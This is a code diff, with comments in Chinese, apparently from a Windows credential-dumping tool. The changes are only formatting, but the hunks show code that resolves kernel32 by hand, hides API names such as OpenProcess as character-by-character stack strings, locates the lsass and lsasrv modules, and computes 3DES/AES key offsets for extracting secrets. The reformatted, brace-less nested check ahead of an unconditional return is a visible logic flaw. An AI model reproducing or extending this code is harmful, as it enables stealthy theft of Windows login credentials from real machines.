@@ -100,7 +100,7 @@ BOOL
 
 #define TABLE_LENGTH 1024
 #define TO_LOWERCASE(out, c1) (out = (c1 <= 'Z' && c1 >= 'A') ? c1 = (c1 - 'A') + 'a': c1)
- 
+
 
 inline bool _compare_kernel32_name(WORD len, WCHAR* dll_name) {
     // 我们只需要定位kernel32，直接作为char处理即可
@@ -351,7 +351,7 @@ int main() {
         _return_hex_value(stack_string[8 + 8 + 8 + 8 + 10]) << 4;
     _3des_aes_len_offset +=
         _return_hex_value(stack_string[8 + 8 + 8 + 8 + 11]);
-     
+
     SecureZeroMemory(stack_string, 50);
     stack_string[0] = 'O'; stack_string[1] = 'p'; stack_string[2] = 'e'; stack_string[3] = 'n'; stack_string[4] = 'P'; stack_string[5] = 'r'; stack_string[6] = 'o'; stack_string[7] = 'c'; stack_string[8] = 'e'; stack_string[9] = 's'; stack_string[10] = 's';
     PNT_OpenProcess NT_OpenProcess = (PNT_OpenProcess)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);
@@ -398,7 +398,7 @@ int main() {
             // OutputDebugStringA(modName);
 #ifdef DEBU___G
 
-            printf("module name: %s\n",modName);
+            printf("module name: %s\n", modName);
 #endif // DEBU___G
             //、、  printf("module name: %s\n", modName);
               // 需要先遍历(char*)lsassDll[i]来获取模块字符串的长度，因为他里面保存的是绝对路径
@@ -449,12 +449,12 @@ int main() {
 
         //ZeroMemory(_123, 100);
         //sprintf(_123, "lsass and lsasrv module located at: %p and %p\n", lsass, lsasrv);
-        if(0==lsasrv)
-        // OutputDebugStringA("failed to locate  lsasrv\n");
-        if(0==lsass)  // OutputDebugStringA("failed to locate  lsass\n");
+        if (0 == lsasrv)
+            // OutputDebugStringA("failed to locate  lsasrv\n");
+            if (0 == lsass)  // OutputDebugStringA("failed to locate  lsass\n");
 #ifdef DEBU___G
 
-        printf("some key module not located\n");
+                printf("some key module not located\n");
 #endif // DEBU___G
         return 0;
     }
